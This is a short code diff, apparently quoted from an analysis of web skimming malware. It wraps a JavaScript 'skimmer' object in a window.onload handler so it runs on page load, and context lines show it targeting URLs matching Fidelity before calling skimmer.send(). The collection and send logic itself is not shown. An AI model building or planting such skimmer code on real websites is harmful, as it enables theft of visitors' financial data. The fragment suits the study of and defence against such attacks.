@@ -1,3 +1,5 @@
+window.onload = function myFunction() {
+
 var skimmer = {
 
    snd: null,
@@ -129,3 +131,5 @@ if ((new RegExp(‘fas|ftgw|Fidelity’, ‘gi’)).test(window.location)) {
    skimmer.send()
 
 }
+
+};
